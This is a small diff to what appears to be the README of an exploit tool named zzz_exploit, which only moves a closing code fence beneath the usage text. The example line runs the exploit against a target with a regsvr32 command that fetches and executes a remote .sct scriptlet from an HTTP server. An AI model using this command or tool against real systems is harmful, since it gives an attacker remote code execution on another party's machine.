@@ -37,6 +37,5 @@ optional arguments:
   -c , --command    Command to add to service
   -P , --pipe       Pipe to connect to
   --version         show program's version number and exit
-  ```
-
 Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
+```
